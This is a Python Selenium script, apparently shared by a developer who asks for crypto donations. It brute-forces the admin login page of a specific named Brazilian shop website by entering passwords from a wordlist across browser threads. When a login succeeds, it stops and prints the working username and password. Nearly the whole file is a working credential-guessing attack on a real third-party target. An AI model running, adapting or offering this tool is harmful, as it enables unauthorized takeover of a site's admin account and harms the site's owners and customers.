# -*- coding: utf-8 -*-
# Developed by B1naryo.
# BNB donation address:0xC5621D754280690e9985a64C8b8C0829a703e5C7

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
import threading
import time
import sys

def test_passwords(passwords, username, passwords_tested, lock, driver, url, invalid_urls):
    input_id = "//input[@type='text']"
    input_pw = "//input[@type='password']"


    for password in passwords:
        try:
            driver.get(url)  # Carregue a URL uma vez antes de inserir username e senha
                             # Load the URL once before entering username and password.

            input_window = driver.find_element_by_xpath(input_id)
            input_window.clear()
            input_window.send_keys(username)

            input_window = driver.find_element_by_xpath(input_pw)
            input_window.clear()
            input_window.send_keys(password + "\n")
            print("\033[91m" + "Username: " + "\033[94m" + username + "\033[0m")
            print("\033[91m" + "Password: " + "\033[94m" + password + "\033[0m")

            time.sleep(1)

            with lock:
                passwords_tested[0] += 1
                print("Passwords tested:", passwords_tested[0])  # Exibir o progresso
                                                                 # Display the progress.

            current_url = driver.current_url
            if current_url != 'https://www.bazarmilenio.com.br/admin/login.asp':
                invalid_urls.append((current_url, username, password))
                print("Detected invalid URL:", current_url)
                print("Stopping execution...")
                sys.exit(1)  # Encerra o programa
                             # Terminate the program.

            # Faça o que precisa ser feito após o envio da senha...
            # Do what needs to be done after sending the password...

        except NoSuchElementException as e:
            print("Erro:", str(e))
            break

        except Exception as e:
            print("Erro:", str(e))
            continue

def create_and_run_threads(num_threads, wordlist, username, url, invalid_urls):
    threads = []
    drivers = []

    for _ in range(num_threads):
        driver = webdriver.Chrome("/home/sandro/AutoLoginForce/chromedriver")
        drivers.append(driver)

    passwords_tested = [0]  # Inicialize o contador de senhas testadas como uma lista para que seja mutável
                            # Initialize the tested passwords counter as a list so that it's mutable

    lock = threading.Lock()  # Crie um Lock para sincronização
                             # Create a Lock for synchronization.

    chunk_size = len(wordlist) // num_threads
    chunks = [wordlist[i:i+chunk_size] for i in range(0, len(wordlist), chunk_size)]

    for i in range(num_threads):
        thread = threading.Thread(target=test_passwords, args=(chunks[i], username, passwords_tested, lock, drivers[i], url, invalid_urls))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    file_path = "/home/sandro/AutoLoginForce/bypass/pass.txt"
    url = 'https://www.bazarmilenio.com.br/admin/login.asp'  # URL que permanecerá a mesma
                                                          # URL that will remain the same.

    with open(file_path) as f:
        wordlist = f.read().splitlines()

    num_threads = 1  # Defina o número desejado de navegadores aqui
                     # Set the desired number of browsers here.

    with open("/home/sandro/AutoLoginForce/bypass/pass.txt") as user_file:
        username = user_file.readline().strip()


    invalid_urls = []  # Lista para armazenar URLs inválidas
                       # List to store invalid URLs.

    create_and_run_threads(num_threads, wordlist, username, url, invalid_urls)

    # Imprima URLs inválidas no final do teste
    # Print invalid URLs at the end of the test.
    print("\nURLs inválidas:")
    for url, username, password in invalid_urls:
        print("URL:", url)
        print("Username:", username)
        print("Password:", password)

